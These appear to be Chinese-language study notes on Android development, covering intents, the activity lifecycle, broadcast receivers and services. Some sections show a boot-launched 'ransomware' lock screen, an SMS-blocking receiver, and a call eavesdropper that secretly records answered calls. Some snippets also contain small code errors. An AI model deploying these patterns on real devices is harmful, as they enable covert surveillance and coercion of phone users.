每个线程要下载的数量 = 总长度 / 线程数量

    size = 10 / 3

给每个线程一个ID =  0、1、 2

线程的开始位置
    startIndex:id*size

线程的结束位置
    endIndex:(id+1)*size-1

最后一个线程的结束位置
    endIndex:length-1



XUtils


/**
 
 */
/**
 
 */
/**
 
 */

创建第二个Activity

    * 应用可以有多个快捷图标
    *每个快捷图标的图标和标签都是独立生成的
    *如果Activity的子节点intent-filter有以下两个属性，则会为此Activity生成快捷图标

        <activity android:name=".MyActivity"
            android:icon="我是图标"
            android:label="我是应用名">
            
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>

                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>

        </activity>


/**
 
 */

Activity 隐式启动和显式启动

    startActivity(new Intent(MainActivity.this, MyActivity.class);


    1.

    /**
     * 隐式启动打电话
     */
    
    private void click1(View v) {
        //隐式启动Activity：通过指定Action动作，指定启动的Activity
        //隐式意图
        Intent intent = new Intent();
        intent.setAction(Intent.ACTION_CALL);
        intent.setData(Uri.parse("tel:110"));
        startActivity(intent);
    }


    2.

    /**
     * 显式启动目标Activity
     */
    
    private void click2(View v) {
        //显式启动Activity：通过指定目标Activity的类名，实现启动
        //显式意图
        //只要启动Activity，就必须要定义意图对象
        Intent intent = new Intent();
        //直接指定目标Activity的类名
        intent.setClassName(this, MyActivity.class);
        startActivity(intent);
    }

    3.

    /**
     * 显示启动拨号器
     */
    
    private void click3(View v) {
        Intent intent = new Intent();
        //显式启动拨号器的包名和类名
        intent.setClassName("com.android.dialer", "com.android.dialer.DialtactsActivity");
        startActivity(intent);
    }

    4.

    /**
     * 隐式启动拨号器
     */

    private void click4(View v) {
        Intent intent = new Intent();
        //隐式指定拨号器的动作
        intent.setAction(Intent.ACTION_DIAL);
        startActivity(intent);
    }

    5.

    /**
     * 隐式启动目标Activity
     */
    
        <activity android:name=".MyActivity" >
       
        //可以定义多个
            <intent-filter>
                <action android:name="asd.asd.asd"/>
                <data android:scheme="haha" android:minmeType="aa/bb"/>
                <data android:scheme="papa" />
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>

            <intent-filter>
                <action android:name="sb.sb.sb"/>
                <data android:scheme="xixi" />
                <category android:name="android.intent.category.DEFAULT"/>//必须要有
            </intent-filter>

        </activity>


    private void click5(View v) {
        Intent intent = new Intent();
        //此Action的值必须与该Activity在清单文件中配置的action标签的name属性值匹配
        intent.setAction("asd.asd.asd");

        /**
         * 下面两个方法不能同时出现
         */
        //此传入的值必须与该Activity在清单文件中配置的data的标签中的scheme属性值匹配
        intent.setData(Uri.parse("haha:我很帅"));
        //设置与data的mimetype属性匹配
        intent.setType("aa/bb");

        intent.addsetDataAndType(Uri.parse("haha:我很帅"), "aa/bb");

        intent.setData(Uri.parse("papa:我真帅"));
        //不写，系统自动添加
        intent.addCategory(Intent.CATEGORY_DEFAULT)
        startActivity(intent);
    }

    目标Activity

    //获取启动此Activity的intent对象
    Intent intent = getIntent();
    Uri uri = intent.getData();

    //输出 haha:我很帅

/**
 
 */

隐式意图和显式意图的应用场景
    
    显式启动：启动同一项目下的Activity
    隐式启动：不同项目下的Activity

    如果隐式意图与不止一个Activity的intent—filter匹配，那么所有Activity所在的应用都会以对应的对话框形式显示供用户选择

    private void click6(View v) {
        Intent intent = new Intent();
        //隐式指定浏览器的动作
        //启动其他应用的Activity必须用隐式
        intent.setAction(Intent.ACTION_VIEW);
        intent.setData(Uri.parse("https://www.baidu.com"));
        startActivity(intent);
    }

    private void click7(View v) {
        Intent intent = new Intent();
        intent.setClassName("com.android.browser", "com.android.browser.BrowserActivity");
        startActivity(intent);
    }

    用隐式方式点开一个网址，系统中有一个以上浏览器的话，会出现选择框

/**
 
 */

Activity 跳转时的数据传递




public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    public void click(View v) {
        EditText et_male = (EditText) findViewById(R.id.et_male);
        EditText et_female = (EditText) findViewById(R.id.et_female);

        String maleName = et_male.getText().toString();
        String femaleName = et_female.getText().toString();

        //跳转至第二个Activity，把男女姓名传递过去，让第二个Activity计算显示姻缘值

        Intent intent = new Intent(this, MyActivity.class);
        intent.putExtra("maleName", maleName);
        intent.putExtra("femaleName", femaleName);
        startActivity(intent);
    }

}

public class MyActivity extends AppCompatActivity {
    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_my);

        Intent intent = getIntent();
        String maleName = intent.getStringExtra("maleName");
        String femaleName = intent.getStringExtra("femaleName");

        TextView male = (TextView) findViewById(R.id.tv_male);
        TextView female = (TextView) findViewById(R.id.tv_female);
        TextView tv = (TextView) findViewById(R.id.tv);

        Random rd = new Random();
        int i = rd.nextInt(100);



        tv.setText(maleName + " 与" + femaleName + "姻缘值为：" + i);
        male.setText(maleName);
        female.setText(femaleName);
    }
}

/**
 
 */

Activity 生命周期方法

    
    /**
     * Activity被创建时，此方法调用
     */
    @Override
    protected void onCreate() {
    }

    /**
     * Activity进入可见状态，但是Activity还未获得焦点
     */
    @Override
    protected void onStart() {
        super.onStart();
    }

    /**
     * Activity获得焦点，可以与用户互动
     */
    @Override
    protected void onResume() {
        super.onResume();
    }

    /**
     * onPause 调用时候，失去焦点，无法与用户交互，但是用户还能看见
     */
    @Override
    protected void onPause() {
        super.onPause();
    }

    /**
     * onStop 调用时候，Activity已经不可见 ，进入后台，依然在内存中
     */
    @Override
    protected void onStop() {
        super.onStop();
    }

    /**
     * Activity被销毁，不存在
     */
    @Override
    protected void onDestroy() {
        super.onDestroy();
    }

    /**
     * Activity已经不可见的状态，此时若要重新进入可见状态 在调用onStart之前，需要先调用 onRestart
     */
    @Override
    protected void onRestart() {
        super.onRestart();
    }

/**
 
 */
Activity 任务栈(task stack)


在 清单文件中 activity 标签 里有一个 android:launchMode 属性（启动模式）


android:launchMode="standard" (标准)
android:launchMode="singleTop" (单独的顶部)
android:launchMode="singleTask" (单独的任务)
android:launchMode="singleInstance" (单例的任务)

singltTop:如果Activity已经在栈顶，就不会再创建了，如果不在栈顶，就可以再次创建

singltTask:栈中永远只有一个该Activity实例，一旦被创建，就不会再次创建，当再次执行启动该Activity的代码是，该Activity会出现
            栈顶，但不是跳转，而是返回，系统会杀死Activity顶上的所有Activity

singleInstance:保证手机中永远只有一个该Activity的实例
    
    如果用10个应用同时启动一个非单例模式的Activity，那么10个应用的栈中，个子会有一个该Activity
    
    如果10个应用同时启动一个单例Activity，那么内存中也只有一个，10个应用启动的都是同一个Activity实例，
    并且该Activity实例不会进入应用的任务栈，而是保存在自己独立的任务栈中


/**
 
 */


横竖屏切换的生命周期
	
	默认情况下，横竖屏切换会导致当前Activity销毁然后重建，其实是为了更好的屏幕适配

	当发生横竖屏切换时候，是 销毁重建 这个顺序

1.	在 清单文件中 activity 标签 里有一个 android:configChanges=(orientation|keyboardHidden|screenSize) 属性(方向改变|软键盘的隐藏|屏幕宽高的改变)（设置改变，只针对单个Activity）

	横竖屏切换的时候 Activity生命周期 中的方法不会在调用

2.  android:screenOrientation="landscape"	//（风景）永远的横屏
	android:screenOrientation="portrait"	//（肖像）永远的竖屏

3.	代码控制
	
	// 设置屏幕方向
        setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);

/**
 
 */

onActivityForResultt 返回数据


public void click2(View v) {
        //跳转至选择联系人界面
//        startActivity(new Intent(this, MyActivity.class));
        //启用这个api启动Activity，当目标Activity销毁时，会调用此Activity的onActivityResult
        startActivityForResult(new Intent(this, MyActivity.class), 1 );
    }

    //此方法用于通过setResult所返回的数据
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        //通过请求码，判断返回的数据来自哪里
        //requestCode判断来自哪里
        //resultCode判断是哪种类型
        if (requestCode == 1) {
            String name = data.getStringExtra("name");
            EditText editText = (EditText) findViewById(R.id.et_name);
            editText.setText(name);
        } else if (requestCode == 2) {
            String sms = data.getStringExtra("Sms");
            EditText editText = (EditText) findViewById(R.id.et_body);
            editText.setText(sms);
        }

    }

    public void click3(View v) {
        //跳转至选择快捷短信界面
//        startActivity(new Intent(this, MyActivity.class));
        //启用这个api启动Activity，当目标Activity销毁时，会调用此Activity的onActivityResult
        startActivityForResult(new Intent(this, SmsActivity.class), 2 );
    }



    /***********************************************/

        final String[] s = new String[] {
                "小胖", "黑色的小胖", "三哈哈哈哈"
        };

        ListView lv = (ListView) findViewById(R.id.lv);

        lv.setAdapter(new ArrayAdapter<String>(this, R.layout.item_listview, R.id.tv_lv, s));

        //给listView的条目设置监听
        lv.setOnItemClickListener(new AdapterView.OnItemClickListener() {
            //position:用户点击哪一个条目
            @Override
            public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
                Intent data = new Intent();
                data.putExtra("name", s[position]);
                //把数据传给它的调用者（启动当前Activity的那个Activity）
                setResult(0, data);
                //直接销毁当前Activity
                finish();
            }
        });
/**
 
 */
/**
 
 */
/**
 
 */

#Android 四大组件
	 Activity
	 BroadcastReceiver (广播提供者)
	 Service
	 ContentProvider

广播：
	Android
	*系统在运行过程中，会产生很多事件：开机、拨打电话、收发短信、电量改变、屏幕解锁
	*一旦发生这种事件，系统就会发送一个广播，为了接收到这个广播，知道系统发生了什么事件
	就需要广播接受者，功能类似收音机



/**
 
 */
	IP 拨号器

	功能：拨打电话时，自动添加ip线路的号码前缀

	原理：系统打电话时，会发送一个打电话广播，ip拨号器只要定义广播接受者接受这个广播，
	那么就可以知道用户什么时候打电话，打电话广播中还会包含用户拨打的号码，ip拨号器可
	以从广播中获取此号码，并且做出修改，添加前缀

	系统发送广播的时候会在清单文件中搜索 能 接收此条广播的应用，所以进程被杀死，
	当有广播发出时，系统自动启动相关应用进程接收此广播

	指定哪条广播

	//权限
	    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>


        <receiver android:name=".CallReceiver">
            <intent-filter>
                <action android:name="android.intent.action.NEW_OUTGOING_CALL"/>
            </intent-filter>
        </receiver>


    /********************************************************************/

        public void click4(View v) {
        String ipNumber="654654";
        SharedPreferences sp = getSharedPreferences("number", MODE_PRIVATE);
        sp.edit().putString("ipNumber", ipNumber).commit();
    }

    /********************************************************************/


    public class CallReceiver extends BroadcastReceiver {

    //广播接受者接收到广播时，此方法调用
    @Override
    public void onReceive(Context context, Intent intent) {

        //获取打电话广播中携带的号码
        String number = getResultData();
        SharedPreferences sp = context.getSharedPreferences("number", context.MODE_PRIVATE);
        String  ipNumber = sp.getString("ipNumber", "");

        //把新的号码放入广播中
        setResultData(ipNumber + number);
    }
}

/**
 
 */

短信拦截器

	*功能：类似短信防火墙
	*系统在收到短信时，会产生一条短信广播，短信广播里，包含了短信的发信人号码和短信的内容，短信应用之所以能收到短信
	其实是收到了短信广播，那我们的短信拦截器，只要在短信应用拿到广播钱，把短信广播拦截，那么短信应用就不会收到广播


/***************************************************************************************/
	
	<uses-permission android:name="android.permission.RECEIVE_SMS"/>

        <receiver android:name=".SmsReceiver">
            <intent-filter android:priority="1000">
                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
            </intent-filter>
        </receiver>

        //优先级 -1000~1000
	android:priority="1000"

/****************************************************************************/

	public class SmsReceiver extends BroadcastReceiver {
	    //intent:广播发送时使用的intent
	    @Override
	    public void onReceive(Context context, Intent intent) {
	        //Bundle 对象也是通过键值对的形式封装数据
	        Bundle bundle = intent.getExtras();
	        //数组中的每个元素都是一条短信
	        Object[] objects = (Object[]) bundle.get("pdus");
	        for (Object object : objects) {
	            //通过pdu创建短信对象
	            SmsMessage message = SmsMessage.createFromPdu((byte[]) object);
	            //获取发信人的号码
	            String address =  message.getOriginatingAddress();
	            //获取短信的内容
	            String body = message.getMessageBody();

	            //需要给优先级    android:priority="1000"
	            if ("138438".equals(address)) {
	                //阻止其他广播接收者接收到这条广播，类似于拦截
	                abortBroadcast();
	            }
	        }
	    }
	}

/**

 */

监听SD卡状态

	*sd卡状态改变时，系统会发送广播

        <receiver android:name=".SDReceiver">
            <intent-filter >
                <action android:name="android.intent.action.MEDIA_MOUNTED"/>
                <action android:name="android.intent.action.MEDIA_UNMOUNTED"/>
                <action android:name="android.intent.action.MEDIA_UNMOUNTABLE"/>
                <data android:scheme="file"/>
            </intent-filter>
        </receiver>

/*************************************************************************************/

	public class SDReceiver extends BroadcastReceiver {
	    @Override
	    public void onReceive(Context context, Intent intent) {
	        String action = intent.getAction();
	        if ("android.intent.action.MEDIA_MOUNTED".equals(action)) {
	            Toast.makeText(context, "sd卡就绪", Toast.LENGTH_SHORT).show();
	        } else if ("android.intent.action.MEDIA_UNMOUNTED".equals(action)) {
	            Toast.makeText(context, "sd卡被卸载", Toast.LENGTH_SHORT).show();
	        } else if ("android.intent.action.MEDIA_UNMOUNTABLE".equals(action)) {
	            Toast.makeText(context, "sd卡被拔出", Toast.LENGTH_SHORT).show();
	        }
	    }
	}

/**
 
 */

勒索软件
	
	super.onBackPressed() 实际调用的是 finish();

	屏蔽掉以后 返回键 是用不了的 ，但是home键可以用

    @Override
    public void onBackPressed() {
        super.onBackPressed();
    }

/*******************************************************************************************/
    
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>

        <receiver android:name=".BootRecevier">
            <intent-filter >
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>

/*******************************************************************************************/

public class BootRecevier extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        //开机启动勒索界面
        Intent intent1 = new Intent(context, MainActivity.class);
        //设置新的任务栈
        intent1.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        //在上下文之外调用startActivity需要上面的标记，没有任务栈下面无法调用
        context.startActivity(intent1);
    }
}

/**
 
 */

应用状态的监听

应用安装、更新、卸载的监听

原理：系统的安装更新卸载时，系统都会产生广播，广播中带有应用的包名


	/***************************************************************************************/

        <receiver android:name=".AppReceiver">
            <intent-filter >
                <action android:name="android.intent.action.PACKAGE_ADDED"/>
                <action android:name="android.intent.action.PACKAGE_REPLACED"/>
                <action android:name="android.intent.action.PACKAGE_REMOVED"/>
                <data android:scheme="package"/>
            </intent-filter>
        </receiver>

	/***************************************************************************************/

	public class AppReceiver extends BroadcastReceiver {
	    @Override
	    public void onReceive(Context context, Intent intent) {
	        //获取收到的广播室那一条
	        String action = intent.getAction();
	        //获取广播中携带的data数据
	        Uri uri = intent.getData();
	        if ("android.intent.action.PACKAGE_ADDED".equals(action)) {
	            Toast.makeText(context, uri.toString() + "被安装了", Toast.LENGTH_SHORT).show();
	        } else if ("android.intent.action.PACKAGE_REPLACED".equals(action)) {
	            Toast.makeText(context, uri.toString() + "被更新了", Toast.LENGTH_SHORT).show();
	        } else if ("android.intent.action.PACKAGE_REMOVED".equals(action)) {
	            Toast.makeText(context, uri.toString() + "被卸载了", Toast.LENGTH_SHORT).show();
	        }
	    }

	}

/**
 
 */

发送自定义广播

	APP 1
	/**
	 * 发送广播
	 */
    public void click5(View v) {
        Intent intent = new Intent();
        intent.setAction("haha.xixi");
        //发送广播
        sendBroadcast(intent);
    }


/************************************************************************************/
	
	APP 2

	/**
	 * 接收广播
	 */

        <receiver android:name=".XXXReceiver">
            <intent-filter >
                <action android:name="haha.xixi"/>
            </intent-filter>
        </receiver>

		/*************************************/


public class XXXReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
    	Toast.makeText(context, "接收到自定义的广播", Toast.LENGTH_SHORT).show();
    }
}

/**

 */

两种广播

无序广播：所有intent-filter与无序广播匹配的广播接收者都可以接收到这条广播，并且没有先后顺序（可以理解为同时）

有序广播：所有intent-filter与有序广播匹配的广播接收者都可以接收到这条广播，但是有先后顺序，按照intent-filter中定义的优先级来决定(-1000~1000)

        	//优先级 -1000~1000
			android:priority="1000"

			//因为打电话应用是从最终广播接收者中启动的，所以一定可以接收到广播并启动


APP 1
	
	/**
	 * 发送有序广播
	 */
    public void click6(View v) {
        Intent intent = new Intent();
        intent.setAction("wo.shi.zhong.yang");
        //1
        sendOrderedBroadcast(intent, null, null, null, 0, "每人发一百斤大米", null);
        //参数三：resultReceiver:这个广播接收者会在所有广播接收者都收到广播了，它才会接收到广播，并且一定能接受到
        sendOrderedBroadcast(intent, null, new CenterReceiver, null, 0, "每人发一百斤大米", null);
    }


    class CenterReceiver extends BroadcastReceiver {
	    	public void onReceive(Context context, Intent intent) {
	        Toast.makeText(context, "中央反贪组接收到文件，内容是：" + getResultData(), Toast.LENGTH_SHORT).show();
	    }
    }


    /*************************************************************/

APP 2
        <receiver android:name=".sheng">
            <intent-filter android:priority="1000">
                <action android:name="wo.shi.zhong.yang"/>
            </intent-filter>
        </receiver>


	public class SDReceiver extends BroadcastReceiver {
	    @Override
	    public void onReceive(Context context, Intent intent) {
	        //拿到红头文件内容
	        String content = getResultData();
	        Toast.makeText(context, "省政府收到文件，内容是：" + content, Toast.LENGTH_SHORT).show();
	        
	        //修改广播内容，按优先级，县、乡接收到的广播为修改后的
	        setResultData("每人发80斤大米");

	        //阻止其他广播接收者接收广播，无序广播这种方法是没有意义的
	        abortBroadcast();
	    }
	}

APP 3
        <receiver android:name=".xian">
            <intent-filter android:priority="800">
                <action android:name="wo.shi.zhong.yang"/>
            </intent-filter>
        </receiver>

    public class SDReceiver extends BroadcastReceiver {
	    @Override
	    public void onReceive(Context context, Intent intent) {
	        //拿到红头文件内容
	        String content = getResultData();
	        Toast.makeText(context, "县政府收到文件，内容是：" + content, Toast.LENGTH_SHORT).show();
	    }
	}

APP 4
        <receiver android:name=".xiang">
            <intent-filter android:priority="600">
                <action android:name="wo.shi.zhong.yang"/>
            </intent-filter>
        </receiver>

	public class SDReceiver extends BroadcastReceiver {
	    @Override
	    public void onReceive(Context context, Intent intent) {
	        //拿到红头文件内容
	        String content = getResultData();
	        Toast.makeText(context, "乡政府收到文件，内容是：" + content, Toast.LENGTH_SHORT).show();
	    }
	}

/**
 
 */

服务
	*默默运行在后台的组件，可以理解为没有前台的Activity，服务的作用就是用来运行需要在后台默默运行的代码

进程优先级

http://www.android-doc.com/guide/components/processes-and-threads.html

	由难到简系统回收服务 4. 5. 在系统内存不足时候自动杀死，系统内存恢复时候也不会被启动

	1.Foreground process(前台进程):

		拥有一个可以与用户交互的Activity(Activity的onResume方法调用)的进程

	2.Visible process(可见进程):

		拥有一个可见但无焦点的Activity(Activity的onPause方法被调用)的进程

	3.Service process(服务进程):

		拥有一个通过 startService() 方法启动的服务的进程

	4.Background process(后台进程):

		拥有一个不可见Activity(Activity的onStop方法被调用) 的进程

	5.Empty process(空进程):

		拥有任何活动的组件(Activity/Service)的进程


/**
 
 */

服务的启动和关闭
    
    服务手动关闭不会被重启

	//启动服务
	public void click7(View v) {
        Intent intent = new Intent(this, MyService.class);
        startService(intent);
    }

    //服务关闭
    public void click8(View v) {
        Intent intent = new Intent(this, MyService.class);
        stopService(intent);
    }

/*******************************************************/

    <service android:name=".MyService"></service>



	public class MyService extends Service {
	    @Nullable
	    @Override
	    public IBinder onBind(Intent intent) {
	        return null;
	    }

	    //服务创建
	    @Override
	    public void onCreate() {
	        super.onCreate();
	    }

	    //服务销毁
	    @Override
	    public void onDestroy() {
	        super.onDestroy();
	    }

	    //服务开始
	    @Override
	    public int onStartCommand(Intent intent, int flags, int startId) {
	        return super.onStartCommand(intent, flags, startId);
	    }

	}

/**
 
 */

电话窃听器

	开机启动

	用户接到来电，一旦接听，立即开始录音，电话挂掉，录音结束，生成音频文件

	*电话的状态
		*空闲
		*响铃
		*摘机

    /*************************************************************************/

    public void click9(View v) {
        Intent intent = new Intent(this, CallService.class);
        startService(intent);
    }

    /*************************************************************************/

        <uses-permission android:name="android.permission.READ_PHONE_STATE"></uses-permission>
        <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
 		<uses-permission android:name="android.permission.RECORD_AUDIO" />
        
        <service android:name=".CallService"></service>

	//录音功能

	http://www.android-doc.com/guide/topics/media/audio-capture.html

    /*************************************************************************/

	public class CallService extends Service {
	    private MediaRecorder mRecorder;
	    @Nullable
	    @Override
	    public IBinder onBind(Intent intent) {
	        return null;
	    }

	    @Override
	    public void onCreate() {
	        super.onCreate();
	        //获取电话管理器，用于监听电话状态
	        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
	        //events:设置电话侦听器只侦听电话状态的改变
	        tm.listen(new MyListener(), PhoneStateListener.LISTEN_CALL_STATE);

	    }



	    class MyListener extends PhoneStateListener {

	        //电话状态一旦改变，此方法调用
	        @Override
	        public void onCallStateChanged(int state, String incomingNumber) {
	            super.onCallStateChanged(state, incomingNumber);
	            switch (state) {
	                //空闲状态
	                case TelephonyManager.CALL_STATE_IDLE:
	                    if (mRecorder != null) {
	                        mRecorder.stop();
	                        mRecorder.release();
	                        mRecorder = null;
	                    }
	                    break;
	                //响铃状态
	                case TelephonyManager.CALL_STATE_RINGING:
	                    if (mRecorder == null) {
	                        mRecorder = new MediaRecorder();
	                        mRecorder = new MediaRecorder();
	                        mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
	                        mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
	                        mRecorder.setOutputFile("sdcard/voice.3gp");
	                        mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);

	                        try {
	                            mRecorder.prepare();
	                        } catch (IOException e) {
	                            e.printStackTrace();
	                        }
	                    }
	                    break;
	                //摘机状态
	                case TelephonyManager.CALL_STATE_OFFHOOK:
	                    if (mRecorder != null) {
	                        mRecorder.start();
	                    }
	                    break;
	            }
	        }
	    }
	}

    /*************************************************************************/
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>


        <receiver android:name=".BootRecevier">
            <intent-filter >
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>


	public class BootRecevier extends BroadcastReceiver {
	    @Override
	    public void onReceive(Context context, Intent intent) {
	        //开机启动勒索界面
	        Intent intent1 = new Intent(context, CallService.class);
	        //设置新的任务栈
	        intent1.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
	        //在上下文之外调用startActivity需要上面的标记
	        context.startService(intent1);
	    }
	}

/**
 
 */
/**
 
 */
/**
 
 */












